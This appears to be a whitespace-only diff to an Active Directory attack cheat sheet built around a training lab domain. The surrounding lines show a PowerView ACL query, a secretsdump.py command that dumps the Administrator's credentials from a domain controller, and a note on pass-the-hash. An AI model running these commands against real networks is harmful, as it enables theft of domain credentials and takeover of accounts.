@@ -488,7 +488,7 @@ Get-ObjectAcl -DistinguishedName "dc=dollarcorp,dc=moneycorp,dc=local" -ResolveG
 
 * Dump Admin credentials with an account that has **permissions to do so**
 
-`secretsdump.py xxx/usename@10.10.10.xxx -just-dc-user Administrator` 
+`secretsdump.py xxx/usename@10.10.10.xxx -just-dc-user Administrator`
 
 * Use extracted hash to perform pass the hash attack
 
